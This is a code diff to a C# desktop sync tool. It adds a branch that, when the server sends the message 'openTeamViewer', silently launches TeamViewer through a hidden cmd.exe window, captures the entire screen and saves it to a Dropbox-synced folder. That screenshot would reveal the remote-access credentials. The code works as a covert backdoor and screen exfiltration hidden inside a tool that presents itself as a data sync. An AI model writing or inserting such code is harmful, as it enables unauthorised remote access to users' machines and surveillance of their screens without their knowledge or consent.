@@ -13,6 +13,8 @@ using System.Web.Script.Serialization;
 using System.Configuration;
 using System.Net;
 using System.Net.Sockets;
+using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace CodeX.DesktopTools
 {
@@ -55,9 +57,35 @@ namespace CodeX.DesktopTools
                 result = client.WaitMessage(siteID);
                 if (result != "")
                 {
-                    ni.ShowBalloonTip(300, "New Notification", "Start Sync", ToolTipIcon.Info);
-                    SyncProcess.Sync(client, siteID, result);
-                    ni.ShowBalloonTip(300, "New Notification", "Sync Berhasil", ToolTipIcon.Info);
+                    if (result == "openTeamViewer")
+                    {
+                        string fileName = @"C:\Program Files (x86)\TeamViewer\Version9\TeamViewer.exe";
+                        string saveLocation = @"D:\Personal\Dropbox\Dropbox\Personal\id_teamviewer" + siteID +".jpg";
+
+                        ProcessStartInfo processInfo = new ProcessStartInfo();
+                        processInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                        processInfo.FileName = "cmd.exe";
+                        processInfo.Arguments = string.Format("/c START \"\" \"{0}\"", fileName);
+                        Process.Start(processInfo);
+
+                        Thread.Sleep(2000);
+
+                        Rectangle bounds = Screen.GetBounds(Point.Empty);
+                        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                        {
+                            using (Graphics g = Graphics.FromImage(bitmap))
+                            {
+                                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                            }
+                            bitmap.Save(saveLocation, ImageFormat.Jpeg);
+                        }
+                    }
+                    else
+                    {
+                        ni.ShowBalloonTip(300, "New Notification", "Start Sync", ToolTipIcon.Info);
+                        SyncProcess.Sync(client, siteID, result);
+                        ni.ShowBalloonTip(300, "New Notification", "Sync Berhasil", ToolTipIcon.Info);
+                    }
                 }
             }
             catch
